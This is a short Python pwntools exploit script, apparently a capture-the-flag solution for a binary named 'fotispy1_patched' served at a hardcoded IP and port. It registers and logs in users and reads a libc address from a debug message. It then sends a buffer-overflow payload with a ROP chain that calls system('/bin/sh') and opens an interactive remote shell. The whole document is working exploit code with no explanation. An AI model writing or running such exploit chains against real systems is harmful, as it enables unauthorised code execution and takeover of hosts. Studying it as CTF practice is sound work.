#!/usr/bin/env python3

from pwn import *

exe = ELF("./fotispy1_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("52.59.124.14", 5191)

def regist(name, password):
    p.sendlineafter(b'[E]: ', b'0')
    p.sendlineafter(b'username: ', name)
    p.sendlineafter(b'password: ', password)

def login(name, password):
    p.sendlineafter(b'[E]: ', b'1')
    p.sendlineafter(b'username: ', name)
    p.sendlineafter(b'password: ', password)


# input()
regist(b'a', b'a')
regist(b'b', b'b')
regist(b'c', b'c')
regist(b'd', b'd')
login(b'd', b'd')
p.sendlineafter(b'[E]: ', b'2')
p.recvuntil(b'[DEBUG] ')
# int(p.recvline()[:-1])
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x525b0
pop_rdi = 0x277e5 + libc.address
print("libc leak: " + hex(libc_leak))
print("libc base: " + hex(libc.address))
payload = b'a'*13 + p64(0x404100) + p64(0) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(0x4019AE) + p64(libc.sym.system)
p.sendlineafter(b'title: ', b'a')
p.sendlineafter(b'from: ', b'a')
p.sendlineafter(b'on: ', payload)
login(b'd', b'd')
p.sendlineafter(b'[E]: ', b'3')

p.interactive()


